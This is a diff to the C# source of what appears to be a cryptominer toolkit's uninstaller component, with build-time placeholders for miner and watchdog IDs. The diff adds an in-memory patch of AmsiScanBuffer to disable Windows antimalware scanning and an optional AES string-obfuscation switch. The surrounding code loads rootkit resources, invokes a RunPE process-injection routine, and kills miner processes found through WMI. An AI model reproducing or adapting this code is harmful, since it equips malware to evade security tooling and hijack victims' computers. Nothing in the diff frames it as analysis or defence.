@@ -24,10 +24,11 @@ public partial class _rUninstaller_
 
     public static void Main()
     {
+        _rPatchAMSI_();
 #if DefRootkit
         try
         {
-            using (var _rarchive_ = new ZipArchive(new MemoryStream(_rGetTheResource_("#RESRKU"))))
+            using (var _rarchive_ = new ZipArchive(new MemoryStream(_rGetTheResource_("#RES_rootkit_u"))))
             {
                 foreach (ZipArchiveEntry _rentry_ in _rarchive_.Entries)
                 {
@@ -94,12 +95,12 @@ public partial class _rUninstaller_
             var _rarg2_ = new ManagementScope("#WMISCOPE", _rarg1_);
             _rarg2_.Connect();
 
-            var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery("Select CommandLine, ProcessID from Win32_Process")).Get();
+            var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery("#WATCHDOGQUERY")).Get();
             foreach (ManagementObject MemObj in _rarg3_)
             {
-                if (MemObj != null && MemObj["CommandLine"] != null && (MemObj["CommandLine"].ToString().Contains("#MINERID") || MemObj["CommandLine"].ToString().Contains("#WATCHDOGID")))
+                if (MemObj != null && MemObj["#STRCMDLINE"] != null && (MemObj["#STRCMDLINE"].ToString().Contains("#MINERID") || MemObj["#STRCMDLINE"].ToString().Contains("#WATCHDOGID")))
                 {
-                    _rCommand_("#SCMD", string.Format("#CMDKILL", MemObj["ProcessID"]));
+                    _rCommand_("#SCMD", string.Format("#CMDKILL", MemObj["#STRPROCID"]));
                 }
             }
         }
@@ -130,9 +131,10 @@ public partial class _rUninstaller_
             string[] _rdomainset_ = new string[] { DOMAINSET };
             for (int i = _rhostscontent_.Count - 1; i >= 0; i--)
             {
-                foreach (string _set_ in _rdomainset_)
+                foreach (string _rset_ in _rdomainset_)
                 {
-                    if (_rhostscontent_[i].Contains(" " + _set_))
+                    string _rcur_ = _rGetString_(_rset_);
+                    if (_rhostscontent_[i].Contains(" " + _rcur_))
                     {
                         _rhostscontent_.RemoveAt(i);
                         break;
@@ -153,11 +155,16 @@ public partial class _rUninstaller_
 
     public static string _rGetString_(string _rarg1_)
     {
-        return Encoding.Unicode.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
+#if DefObfuscate
+        return Encoding.UTF8.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
+#else
+        return _rarg1_;
+#endif
     }
 
     public static byte[] _rAESMethod_(byte[] _rinput_, bool _rencrypt_ = false)
     {
+#if DefObfuscate
         var _rkeybytes_ = new Rfc2898DeriveBytes(@"#AESKEY", Encoding.ASCII.GetBytes(@"#SALT"), 100).GetBytes(16);
         using (Aes _raesAlg_ = Aes.Create())
         {
@@ -171,6 +178,9 @@ public partial class _rUninstaller_
                 return _rmsDecrypt_.ToArray();
             }
         }
+#else
+        return _rinput_;
+#endif
     }
 
     public static void _rCommand_(string _rarg1_, string _rarg2_)
@@ -197,13 +207,44 @@ public partial class _rUninstaller_
 #if DefRootkit
     public static byte[] _rGetTheResource_(string _rarg1_)
     {
-        var MyResource = new System.Resources.ResourceManager("#RESPARENT", Assembly.GetExecutingAssembly());
+        var MyResource = new System.Resources.ResourceManager("#RES_parent", Assembly.GetExecutingAssembly());
         return _rAESMethod_((byte[])MyResource.GetObject(_rarg1_));
     }
     
     public static void _rRun_(byte[] _rpayload_, string _rinjectionpath_, string _rarguments_)
     {
-        Assembly.Load(_rGetTheResource_("#RESRPE")).GetType("#RUNPETYPE").GetMethod("#RUNPEMETHOD", BindingFlags.Public | BindingFlags.Static).Invoke(null, new object[] { _rpayload_, _rinjectionpath_, _rarguments_ });
+        Assembly.Load(_rGetTheResource_("#RES_runpe")).GetType("#RUNPETYPE").GetMethod("#RUNPEMETHOD", BindingFlags.Public | BindingFlags.Static).Invoke(null, new object[] { _rpayload_, _rinjectionpath_, _rarguments_ });
     }
 #endif
+
+    [DllImport("kernel32")]
+    static extern IntPtr GetProcAddress(
+        IntPtr hModule,
+        string procName);
+
+    [DllImport("kernel32")]
+    static extern IntPtr LoadLibrary(
+        string name);
+
+    [DllImport("kernel32")]
+    static extern bool VirtualProtect(
+        IntPtr lpAddress,
+        UIntPtr dwSize,
+        uint flNewProtect,
+        out uint lpflOldProtect);
+
+    public static void _rPatchAMSI_()
+    {
+        try
+        {
+            var _rasb_ = GetProcAddress(LoadLibrary("#AMSIDLL"), "#AMSIBUFFER");
+            var _rpatch_ = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+
+            uint _roldProtect_ = 0;
+            VirtualProtect(_rasb_, (UIntPtr)_rpatch_.Length, 0x40, out _roldProtect_);
+            Marshal.Copy(_rpatch_, 0, _rasb_, _rpatch_.Length);
+            VirtualProtect(_rasb_, (UIntPtr)_rpatch_.Length, _roldProtect_, out _roldProtect_);
+        }
+        catch { }
+    }
 }
